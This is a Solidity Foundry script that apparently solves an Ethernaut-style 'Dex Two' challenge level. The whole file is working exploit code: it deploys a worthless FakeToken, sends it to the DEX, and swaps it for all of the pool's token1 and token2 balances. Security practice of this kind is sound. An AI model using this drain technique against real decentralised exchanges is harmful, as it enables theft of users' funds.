// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IDex2 {
    function swap(address from, address to, uint256 amount) external;

    function token1() external returns (address);
    function token2() external returns (address);
    function approve(address spender, uint256 amount) external;
    function balanceOf(
        address token,
        address account
    ) external returns (uint256);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract AttackDexScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address level23 = 0x788D241Dc258aaE8C9b16549D337132629938E57;
        IDex2 dex = IDex2(payable(level23));
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.approve(address(dex), type(uint256).max);

        FakeToken faketoken_contract = new FakeToken();
        faketoken_contract.mint(400);
        faketoken_contract.approve(address(dex), type(uint256).max);
        faketoken_contract.transfer(address(dex), 100);

        IDex2(level23).swap(address(faketoken_contract), token1, 100);
        IDex2(level23).swap(address(faketoken_contract), token2, 200);

        console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
        console.log("Balance of token2", dex.balanceOf(token2, address(dex)));

        vm.stopBroadcast();
    }
}

contract FakeToken is IERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
